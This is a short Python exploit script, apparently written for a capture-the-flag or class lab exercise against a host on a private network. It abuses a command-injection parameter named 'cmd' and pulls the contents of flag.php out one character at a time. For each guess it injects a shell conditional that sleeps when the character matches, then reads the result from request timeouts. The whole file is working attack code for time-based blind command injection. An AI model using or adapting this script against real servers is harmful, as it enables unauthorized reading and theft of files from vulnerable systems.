import requests
import time
url = "http://192.168.1.6:19080/class08/1.php"
result = ""
for i in range(1,5):
    for j in range(1,55):
        #ascii码表
        for k in range(32,128):
            k=chr(k)
            #time.sleep(0.1)
            payload = "?cmd=" + f"if [ `cat flag.php | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "
